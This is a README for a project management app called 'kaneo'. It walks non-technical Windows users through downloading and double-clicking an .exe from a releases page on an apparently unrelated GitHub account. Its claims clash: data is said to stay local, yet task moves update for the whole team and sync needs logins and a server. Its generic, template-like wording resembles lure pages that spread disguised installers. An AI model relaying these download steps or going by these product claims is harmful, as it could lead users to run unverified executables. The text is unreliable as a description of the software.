# 🎯 kaneo - Manage your projects with simple tools

[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/dimitrifootless152/kaneo/releases)

Kaneo helps you organize tasks and projects. It removes clutter so you focus on your actual work. You use it to track issues, plan sprints, and manage your team output without complex menus or steep learning curves.

## 📥 How to download the software

To start using the application on your computer, follow these steps:

1. Visit the [official releases page](https://github.com/dimitrifootless152/kaneo/releases).
2. Look for the latest version at the top of the list.
3. Click the file that ends in .exe for Windows.
4. Save the file to your computer.
5. Open the folder where you saved the file.
6. Double-click the file to start the installation.
7. Follow the prompts on your screen to complete the setup.

## 🛠 System requirements

Your computer must meet these basic needs to run the software smoothly:

* Operating System: Windows 10 or Windows 11.
* Memory: At least 4 gigabytes of RAM.
* Storage: 200 megabytes of free space.
* Internet Connection: Required for updates and syncing data.

## 🚀 Setting up your first project

Once you install and open the application, the welcome screen appears. Follow these steps to set up your workspace:

1. Click the "Create New Project" button in the center of the window.
2. Enter a name for your project in the text box.
3. Choose a color label for your project to keep things organized.
4. Select the "Kanban" board layout if you want to see tasks in columns.
5. Click "Save" to finish.

## 📝 Managing your tasks

The main view displays your project board. You can add, move, and edit tasks here.

* Add a task: Click the "Plus" icon at the top of a column. Type your task title and press Enter.
* Move a task: Click and hold the task card, then drag it to a different column. This updates the status of the task for everyone on your team.
* Edit details: Click any task card to open the detail panel. Here, you add descriptions, due dates, and priority levels.

## 🔍 Understanding the board columns

The board uses columns to show the progress of your work. By default, you see three stages:

* To Do: New tasks that you plan to start soon.
* In Progress: Work that you currently perform.
* Done: Completed tasks that require no further action.

You can rename these columns or add new ones by clicking the settings icon at the top right of the board.

## ⚙️ Customizing your experience

You can change how the app looks and behaves in the settings menu. Click your profile icon at the bottom left to open the menu.

* Theme: Switch between light mode and dark mode to suit your lighting preference.
* Notifications: Choose which actions trigger a pop-up alert on your screen.
* Shortcuts: View a list of key combinations that help you navigate the app faster.

## 🛡 Keeping your data safe

Kaneo stores your information locally on your machine. This means you control your data at all times. If you need to move your project to another computer, use the "Export Data" tool in the settings menu to save a backup file. You can import this file on any other machine that has the app installed.

## 🆘 Troubleshooting common issues

If you encounter problems while using the software, try these steps:

* Software does not open: Restart your computer and try opening the app again.
* Updates fail: Check your internet connection and ensure your firewall allows the app to reach the server.
* Board does not sync: Log out and log back in to refresh your connection.
* Errors occur: Check the releases page to see if a newer version of the software addresses known bugs.

## 🤝 Contributing to the project

Kaneo stays free and open because of users like you. You can report bugs or suggest new features by opening an issue on the GitHub repository. Clear descriptions help the developers understand your needs and improve the application for everyone.
